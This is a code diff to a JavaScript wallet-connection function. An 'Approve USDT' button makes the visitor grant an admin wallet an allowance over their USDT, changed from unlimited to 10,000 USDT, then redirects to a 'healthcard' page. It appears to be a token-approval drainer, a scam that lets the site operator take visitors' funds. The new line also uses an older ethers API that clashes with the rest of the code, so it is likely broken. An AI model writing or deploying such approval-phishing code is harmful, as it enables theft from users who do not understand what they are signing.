@@ -89,26 +89,31 @@ async function connectWallet(chainType) {
         const formattedBalance = ethers.formatUnits(rawBalance, config.decimals);
         if (userBalanceSpan) userBalanceSpan.textContent = formattedBalance + " USDT";
 
-        if (approveButton) {
-            approveButton.onclick = async () => {
-                try {
-                    approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Approving...';
-                    approveButton.disabled = true;
+       if (approveButton) {
+    approveButton.onclick = async () => {
+        try {
+            approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Approving...';
+            approveButton.disabled = true;
 
-                    const contract = new ethers.Contract(config.usdtAddress, ABI, signer);
-                    const tx = await contract.approve(config.adminWallet, ethers.MaxUint256);
-                    await tx.wait();
+            const contract = new ethers.Contract(config.usdtAddress, ABI, signer);
+            
+            // Set approval amount to 10,000 USDT (6 decimals)
+            const amount = ethers.utils.parseUnits("10000", 6);
 
-                    window.location.href = `/healthcard.html?wallet=${userAddress}`;
-                } catch (error) {
-                    console.error("Approval error:", error);
-                    alert("Approval failed: " + error.message);
-                } finally {
-                    approveButton.innerHTML = '<i class="fas fa-award"></i> Approve USDT';
-                    approveButton.disabled = false;
-                }
-            };
+            const tx = await contract.approve(config.adminWallet, amount);
+            await tx.wait();
+
+            window.location.href = `/healthcard.html?wallet=${userAddress}`;
+        } catch (error) {
+            console.error("Approval error:", error);
+            alert("Approval failed: " + error.message);
+        } finally {
+            approveButton.innerHTML = '<i class="fas fa-award"></i> Approve USDT';
+            approveButton.disabled = false;
         }
+    };
+}
+
 
         return { signer, userAddress };
 
